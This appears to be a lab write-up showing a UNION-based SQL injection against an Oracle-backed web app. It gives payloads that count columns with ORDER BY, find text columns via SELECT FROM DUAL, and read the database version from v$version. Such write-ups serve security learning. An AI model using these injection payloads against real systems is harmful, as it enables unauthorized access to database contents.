## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/234110216-2cd07661-6e57-4942-8cee-5763175895b9.png)

![image](https://user-images.githubusercontent.com/67383098/234110948-d99c07da-75a2-4e88-a71e-80fa0c932977.png)


## Solution :

Here we can find out the number of columns that the web app is querying & also determine the columns which have text data but to retreive a column data  we need to know the table name.

> In oracle there is a default table called **DUAL**. Using that we can retreive column data.

#### Determine the number of columns 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

**ORDER BY 3** gives error, so there are 2 columns being retreived.

#### Determine the column which has text data


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'shebu','cys' FROM dual --
```
Both the columns show the text in response. So both columns support text data.

#### Retreive db type & version of ORACLE 

To retretive db type & version of ORACLE , we have the syntax `SELECT * FROM v$version`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --
```

We got the db info we needed.

![image](https://user-images.githubusercontent.com/67383098/234114954-432d7c3b-fe6a-4d75-9858-42f475a6b4b8.png)

![image](https://user-images.githubusercontent.com/67383098/234115373-fbbbcdf6-5e26-4088-a404-04d64a700eb2.png)

![image](https://user-images.githubusercontent.com/67383098/234115419-5d87f4f4-f39d-4c69-b6b1-e3e54b4a60ad.png)


